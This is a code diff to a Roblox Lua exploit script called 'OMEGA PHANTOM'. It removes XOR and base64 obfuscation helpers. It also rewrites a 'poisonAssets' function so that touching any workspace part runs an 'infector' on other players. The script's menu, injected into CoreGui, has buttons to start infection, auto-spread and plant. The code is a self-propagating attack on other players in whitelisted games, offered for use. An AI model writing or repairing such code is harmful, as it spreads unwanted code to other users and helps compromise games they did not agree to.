@@ -1,4 +1,4 @@
--- OMEGA PHANTOM | THE FINAL PROTOCOL (SYNTAX-FIXED) | 109er_0
+-- OMEGA PHANTOM | TOUCH TRANSMITTER FIX | 109er_0
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -27,35 +27,6 @@ local whitelistGames = {
     14125553864, 5375399205, 14940596979, 98381723384335, 1559329620, 2521496850,
     1962086498, 1277113435, 134236244017051, 18381724395
 }
-
-local function xorEncode(data, key)
-    local encoded = ""
-    for i = 1, #data do
-        local charCode = string.byte(data, i)
-        local keyCode = string.byte(key, (i-1) % #key + 1)
-        encoded = encoded .. string.char(bit32.bxor(charCode, keyCode))
-    end
-    return encoded
-end
-
-local function base64Encode(data)
-    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    local result = ""
-    for i = 1, #data, 3 do
-        local b1, b2, b3 = string.byte(data, i, i+2)
-        b2 = b2 or 0
-        b3 = b3 or 0
-        local n = b1 * 0x10000 + b2 * 0x100 + b3
-        local c1 = math.floor(n / 0x40000)
-        local c2 = math.floor((n % 0x40000) / 0x1000)
-        local c3 = math.floor((n % 0x1000) / 0x40)
-        local c4 = n % 0x40
-        result = result .. b64chars:sub(c1+1, c1+1) .. b64chars:sub(c2+1, c2+1)
-        if i+1 <= #data then result = result .. b64chars:sub(c3+1, c3+1) else result = result .. "=" end
-        if i+2 <= #data then result = result .. b64chars:sub(c4+1, c4+1) else result = result .. "=" end
-    end
-    return result
-end
 
 local function encode(s)
     local out = ""
@@ -354,10 +325,7 @@ local function CreateMenuGUI()
     btnSpread.TextSize = 14
     btnSpread.Parent = frame
     btnSpread.MouseButton1Click:Connect(function()
-        if infectionActive then
-            autoSpreadEnabled = true
-            autoSpreadTrigger()
-        end
+        if infectionActive then autoSpreadEnabled = true; autoSpreadTrigger() end
     end)
     local btnPlant = Instance.new("TextButton")
     btnPlant.Size = UDim2.new(0.8,0,0,40)
@@ -400,9 +368,7 @@ local function CreateMenuGUI()
     title.Parent = frame
     title.InputBegan:Connect(function(i)
         if i.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = i.Position
-            frameStart = frame.Position
+            dragging = true; dragStart = i.Position; frameStart = frame.Position
         end
     end)
     title.InputChanged:Connect(function(i)
@@ -415,11 +381,10 @@ local function CreateMenuGUI()
     frame.Parent = CoreGui
 end
 
+-- ====================== CORRECTED POISON ASSETS (NO TouchTransmitter) ======================
 local function poisonAssets()
     for _, part in pairs(Workspace:GetDescendants()) do
         if part:IsA("BasePart") and not part:FindFirstChild("PoisonTouch") then
-            local touch = Instance.new("TouchTransmitter")
-            touch.Name = "PoisonTouch"
             local function onTouch(otherPart)
                 local player = Players:GetPlayerFromCharacter(otherPart.Parent)
                 if player and player ~= LocalPlayer and infectionActive then
@@ -434,8 +399,10 @@ local function poisonAssets()
                     infector:Destroy()
                 end
             end
-            touch.Touched:Connect(onTouch)
-            touch.Parent = part
+            part.Touched:Connect(onTouch)
+            local marker = Instance.new("BoolValue")
+            marker.Name = "PoisonTouch"
+            marker.Parent = part
         end
     end
 end
